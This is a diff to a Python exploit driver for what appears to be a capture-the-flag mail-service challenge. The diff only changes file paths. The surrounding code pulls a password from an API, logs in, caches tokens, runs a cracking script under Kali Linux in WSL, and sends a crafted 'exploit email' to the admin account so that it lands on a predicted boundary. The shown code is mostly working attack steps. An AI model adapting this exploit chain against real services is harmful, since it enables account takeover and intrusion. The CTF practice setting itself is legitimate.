@@ -9,13 +9,13 @@ probe-check alignment -> send exploit mail with predicted reply boundary ->
 import sys, os, json, re, time, subprocess, http.client
 from urllib.parse import urlparse
 
-sys.path.insert(0, r'D:\ctf-index')
+sys.path.insert(0, r'.')
 from _z_496_spec import make_D, make_subj, PWN
 
 BASE = sys.argv[1].rstrip('/')
 WARM = int(sys.argv[2]) if len(sys.argv) > 2 else 700
-BOUNDS = r'D:\ctf-index\_z_496_bounds.json'
-PRED = r'D:\ctf-index\_z_496_pred.json'
+BOUNDS = r'./_z_496_bounds.json'
+PRED = r'./_z_496_pred.json'
 
 u = urlparse(BASE)
 HOST, PORT = u.hostname, u.port or 80
@@ -52,7 +52,7 @@ def req(method, path, obj=None, token=None):
 
 # ---------------- 1. credentials ----------------
 try:
-    cfg = json.load(open(r'D:\ctf-index\_z_496_remote.json'))
+    cfg = json.load(open(r'./_z_496_remote.json'))
 except Exception:
     cfg = {}
 if cfg.get('base') == BASE and cfg.get('tok'):
@@ -61,7 +61,7 @@ if cfg.get('base') == BASE and cfg.get('tok'):
 else:
     pw = req('GET', '/api/password')
     tok = req('POST', '/api/login', {'username': 'user@ses', 'password': pw})
-    json.dump({'base': BASE, 'pw': pw, 'tok': tok}, open(r'D:\ctf-index\_z_496_remote.json', 'w'))
+    json.dump({'base': BASE, 'pw': pw, 'tok': tok}, open(r'./_z_496_remote.json', 'w'))
 print('[i] pw =', pw, ' tok =', tok[:12])
 me = req('GET', '/api/me', None, tok)
 print('[i] logged in as', me)
@@ -98,7 +98,7 @@ print('[i] sample', bounds[:2], bounds[-2:], flush=True)
 
 # ---------------- 3. crack in WSL ----------------
 t0 = time.time()
-r = subprocess.run(['wsl', '-d', 'kali-linux', '--', 'python3', '/mnt/d/ctf-index/_z_496_crack2.py'],
+r = subprocess.run(['wsl', '-d', 'kali-linux', '--', 'python3', './_z_496_crack2.py'],
                    capture_output=True, text=True)
 print('[i] crack rc=%d %.1fs' % (r.returncode, time.time() - t0))
 print(r.stdout[-800:])
@@ -123,7 +123,7 @@ print('[i] subject length', len(subj))
 eid = req('POST', '/api/send', {'to': 'admin@ses', 'subject': subj, 'body': 'hello'}, tok)
 print('[i] exploit email id', eid, '(consumed preds[1] =', preds[1], ')')
 json.dump({'base': BASE, 'tok': tok, 'B1': B1, 'eid': eid, 'preds': preds},
-          open(r'D:\ctf-index\_z_496_state.json', 'w'))
+          open(r'./_z_496_state.json', 'w'))
 
 # ---------------- 6. two bot runs ----------------
 t0 = time.time()
